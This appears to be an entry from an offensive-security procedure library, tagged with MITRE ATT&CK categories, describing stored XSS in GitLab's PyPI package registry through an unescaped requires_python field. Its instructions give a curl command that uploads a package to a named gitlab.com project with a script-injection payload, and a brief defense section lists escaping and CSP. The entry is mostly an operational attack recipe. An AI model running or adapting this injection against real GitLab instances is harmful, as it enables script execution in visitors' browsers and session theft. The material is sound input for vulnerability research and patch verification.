---
id: proc-upload-pypi-xss
tags:
  - xss
  - upload
  - pypi
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-pypi-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:20.502Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload-Malicious-PyPi-Package-with-XSS-Payload

## Summary

This procedure uploads a PyPi package to GitLab's registry via API, injecting a stored XSS payload into the requires_python field, which is unsanitized and rendered in the simple API endpoint's HTML.

## Description

The vulnerability stems from package_presenter.rb inserting user-supplied requires_python directly into a data-requires-python HTML attribute without escaping, limited only by a 50-character DB constraint. The payload '"><script>alert(1)</script>' breaks out and injects JS. Upload uses multipart form data to the /api/v4/projects/:id/packages/pypi endpoint. Impact includes JS execution on visitors, enabling session theft or phishing.

## Requirements

1. GitLab project ID and personal access token with package write permissions
2. Dummy package file (e.g., /tmp/lala.txt containing minimal package content)
3. curl installed for API requests

## Defense

Defensive measures and detection strategies:

- Sanitize/escape requires_python in package_presenter.rb (e.g., use Rails html_escape)
- Implement CSP with strict script-src policies; monitor for bypass attempts via multi-version uploads
- Rate-limit package uploads and scan payloads for script tags

## Objectives

1. Store malicious payload in the database via package metadata
2. Prepare for rendering on the simple endpoint
3. Achieve breakout from HTML attribute

## Instructions

### Step 1: Prepare Package File

**Context**: Create a simple text file as package content.

**Command**:
```bash
echo "dummy content" > /tmp/lala.txt
```

> This file is uploaded as the package body; content is irrelevant for XSS.

### Step 2: Upload Package with Payload

**Context**: Use the API to upload, overriding requires_python with the XSS payload.

**Command** ([[commands/curl-upload-pypi-xss]]):
```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

> Verbose output shows HTTP 201 on success. The second -F requires_python overrides the first, injecting the payload. Verify via API list packages.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-pypi-xss]]

## Tools Used

- [[tools/curl]]

## Tags

- [[xss]]
- [[upload]]
- [[pypi]]
